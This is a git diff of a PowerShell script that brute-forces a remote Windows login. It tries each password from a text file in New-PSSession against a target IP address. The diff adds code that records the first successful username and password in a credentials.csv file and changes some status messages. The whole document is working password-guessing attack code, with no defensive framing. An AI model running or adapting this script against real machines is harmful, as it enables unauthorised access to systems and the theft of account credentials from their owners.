@@ -2,6 +2,13 @@
 # Each time it runs, it will print the password that it tried and whether it succeeded or failed.
 # The script will then close the PSSession if it succeeded.
 
+# CSV file structure before should be:
+# Username,Password
+
+# CSV file structure after should be:
+# Username,Password
+# user1,pass1
+
 # Import the txt file with passwords
 $passwords = Get-Content -Path "Powershell\passwords.txt"
 
@@ -19,14 +26,17 @@ foreach ($password in $passwords) {
     $session = New-PSSession -ComputerName $ip -Credential $credentialObject -ErrorAction SilentlyContinue
 
     if ($?) {
-        Write-Host "New-PSSession succeeded"
+        #Write-Host "New-PSSession succeeded"
+        Exit-PSSession
         # Print the password and that it succeeded
         Write-Host "Suceeded: $password"
-        Exit-PSSession
+        # Append the username and successful password on a new line in credentials.csv
+        Add-Content -Path "Powershell\credentials.csv" -Value "`r`n$username,$password"
+        Write-Host "Added credentials to credentials.csv."
         break
     }
     else {
-        Write-Host "New-PSSession failed"
+        #Write-Host "New-PSSession failed"
         # Print the password and that it failed
         Write-Host "Failed: $password"
     }
